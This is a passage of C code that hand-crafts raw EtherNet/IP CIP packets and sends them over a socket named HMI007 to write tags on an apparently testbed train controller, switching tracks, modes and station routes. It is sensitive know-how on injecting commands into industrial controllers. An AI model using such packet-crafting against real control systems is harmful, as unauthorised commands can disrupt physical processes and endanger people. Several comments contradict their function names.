	byte sendMessageStr1[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0c,	/*Data Size*/
		0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x31, 0x5f, 0x4f, 0x6e, 0x5f, 0x32, /*Train_1_on_2*/	0xc1, 0x00, 0x01, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr1, 67, 0);
	CIPCount1++;
	Sleep(10);

	byte sendMessageStr2[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0c,	/*Data Size*/
		0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x31, 0x5f, 0x4f, 0x6e, 0x5f, 0x33, /*Train_1_on_3*/	0xc1, 0x00, 0x01, 0x00, 0x01 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr2, 67, 0);
	CIPCount1++;
}

void InsideCW(void)
{
	//outside clockwise
	byte sendMessageStr1[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0c,	/*Data Size*/
		0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x32, 0x5f, 0x4f, 0x6e, 0x5f, 0x32, /*Train_2_on_2*/	0xc1, 0x00, 0x01, 0x00, 0x01 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr1, 67, 0);
	CIPCount1++;
	Sleep(10);

	byte sendMessageStr2[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0c,	/*Data Size*/
		0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x32, 0x5f, 0x4f, 0x6e, 0x5f, 0x33, /*Train_2_on_3*/	0xc1, 0x00, 0x01, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr2, 67, 0);
	CIPCount1++;
}

void InsideCCW(void)
{
	//outside counter clockwise
	byte sendMessageStr1[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0c,	/*Data Size*/
		0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x32, 0x5f, 0x4f, 0x6e, 0x5f, 0x32, /*Train_2_on_2*/	0xc1, 0x00, 0x01, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr1, 67, 0);
	CIPCount1++;
	Sleep(10);

	byte sendMessageStr2[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0c,	/*Data Size*/
		0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x32, 0x5f, 0x4f, 0x6e, 0x5f, 0x33, /*Train_2_on_3*/	0xc1, 0x00, 0x01, 0x00, 0x01 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr2, 67, 0);
	CIPCount1++;
}

void ManualMode(void)
{
	byte sendMessageStr1[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0b,	/*Data Size*/
		0x4d, 0x61, 0x6e, 0x75, 0x61, 0x6c, 0x5f, 0x69, 0x6e, 0x69, 0x74, /*Manual_init*/	0x00,		0xc1, 0x00, 0x01, 0x00, 0x01 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr1, 67, 0);
	CIPCount1++;
	Sleep(500);

	byte sendMessageStr2[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0b,	/*Data Size*/
		0x4d, 0x61, 0x6e, 0x75, 0x61, 0x6c, 0x5f, 0x69, 0x6e, 0x69, 0x74, /*Manual_init*/	0x00,		0xc1, 0x00, 0x01, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr2, 67, 0);
	CIPCount1++;
	Sleep(2500);

	byte sendMessageStr3[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0b,	/*Data Size*/
		0x4d, 0x61, 0x6e, 0x75, 0x61, 0x6c, 0x5f, 0x69, 0x6e, 0x69, 0x74, /*Manual_init*/	0x00,		0xc1, 0x00, 0x01, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr3, 67, 0);
	CIPCount1++;
}

void AutoMode(void)
{
	byte sendMessageStr1[] = { 0x70, 0x00,	/*Send Unit Data*/		0x29, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x15, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x06, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x09,	/*Data Size*/
		0x41, 0x75, 0x74, 0x6f, 0x5f, 0x69, 0x6e, 0x69, 0x74, /*Auto_init*/		0x00,		0xc1, 0x00, 0x01, 0x00, 0x01 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr1, 65, 0);
	CIPCount1++;
	Sleep(500);

	byte sendMessageStr2[] = { 0x70, 0x00,	/*Send Unit Data*/		0x29, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x15, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x06, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x09,	/*Data Size*/
		0x41, 0x75, 0x74, 0x6f, 0x5f, 0x69, 0x6e, 0x69, 0x74, /*Auto_init*/		0x00,		0xc1, 0x00, 0x01, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr2, 65, 0);
	CIPCount1++;
	Sleep(2500);

	byte sendMessageStr3[] = { 0x70, 0x00,	/*Send Unit Data*/		0x29, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x15, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x06, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x09,	/*Data Size*/
		0x41, 0x75, 0x74, 0x6f, 0x5f, 0x69, 0x6e, 0x69, 0x74, /*Auto_init*/		0x00,		0xc1, 0x00, 0x01, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr3, 65, 0);
	CIPCount1++;
}

void ToStation2(void)
{
	byte sendMessageStr1[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2d, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x19, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x08, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0d,	/*Data Size*/
		0x41, 0x75, 0x74, 0x6f, 0x5f, 0x4d, 0x6f, 0x64, 0x5f, 0x32, 0x74, 0x6f, 0x33, /*Auto_Mod_2to3*/		0x00,		0xc1, 0x00, 0x01, 0x00, 0x01 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr1, 69, 0);
	CIPCount1++;
	Sleep(500);

	byte sendMessageStr2[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2d, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x19, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x08, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0d,	/*Data Size*/
		0x41, 0x75, 0x74, 0x6f, 0x5f, 0x4d, 0x6f, 0x64, 0x5f, 0x32, 0x74, 0x6f, 0x33, /*Auto_Mod_2to3*/		0x00,		0xc1, 0x00, 0x01, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr2, 69, 0);
	CIPCount1++;
	Sleep(2500);

	byte sendMessageStr3[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2d, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x19, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x08, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0d,	/*Data Size*/
		0x41, 0x75, 0x74, 0x6f, 0x5f, 0x4d, 0x6f, 0x64, 0x5f, 0x32, 0x74, 0x6f, 0x33, /*Auto_Mod_2to3*/		0x00,		0xc1, 0x00, 0x01, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr3, 69, 0);
	CIPCount1++;
}

void ToStation3(void)
{
	byte sendMessageStr1[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2f, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x1b, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x09, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0f,	/*Data Size*/
		0x41, 0x75, 0x74, 0x6f, 0x5f, 0x32, 0x74, 0x6f, 0x33, 0x5f, 0x53, 0x74, 0x61, 0x72, 0x74,  /*Auto_2to3_Start*/	0x00,		0xc1, 0x00, 0x01, 0x00, 0x01 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr1, 71, 0);
	CIPCount1++;
	Sleep(500);

	byte sendMessageStr2[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2f, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x1b, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x09, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0f,	/*Data Size*/
		0x41, 0x75, 0x74, 0x6f, 0x5f, 0x32, 0x74, 0x6f, 0x33, 0x5f, 0x53, 0x74, 0x61, 0x72, 0x74,  /*Auto_2to3_Start*/	0x00,		0xc1, 0x00, 0x01, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr2, 71, 0);
	CIPCount1++;
	Sleep(2500);

	byte sendMessageStr3[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2f, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x1b, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x09, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0f,	/*Data Size*/
		0x41, 0x75, 0x74, 0x6f, 0x5f, 0x32, 0x74, 0x6f, 0x33, 0x5f, 0x53, 0x74, 0x61, 0x72, 0x74,  /*Auto_2to3_Start*/	0x00,		0xc1, 0x00, 0x01, 0x00, 0x00 /*Specific Data*/ };
	
	sendStatus = send(HMI007, sendMessageStr3, 71, 0);
	CIPCount1++;
}

void ToStation4(void)
{
	byte sendMessageStr1[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2d, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x19, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x08, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0d,	/*Data Size*/
		0x41, 0x75, 0x74, 0x6f, 0x5f, 0x4d, 0x6f, 0x64, 0x5f, 0x32, 0x74, 0x6f, 0x34, /*Auto_Mod_2to4*/		0x00,		0xc1, 0x00, 0x01, 0x00, 0x01 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr1, 69, 0);
	CIPCount1++;
	Sleep(500);

	byte sendMessageStr2[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2d, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x19, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x08, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0d,	/*Data Size*/
		0x41, 0x75, 0x74, 0x6f, 0x5f, 0x4d, 0x6f, 0x64, 0x5f, 0x32, 0x74, 0x6f, 0x34, /*Auto_Mod_2to4*/		0x00,		0xc1, 0x00, 0x01, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr2, 69, 0);
	CIPCount1++;
	Sleep(2500);

	byte sendMessageStr3[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2d, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x19, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x08, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0d,	/*Data Size*/
		0x41, 0x75, 0x74, 0x6f, 0x5f, 0x4d, 0x6f, 0x64, 0x5f, 0x32, 0x74, 0x6f, 0x34, /*Auto_Mod_2to4*/		0x00,		0xc1, 0x00, 0x01, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr3, 69, 0);
	CIPCount1++;
}
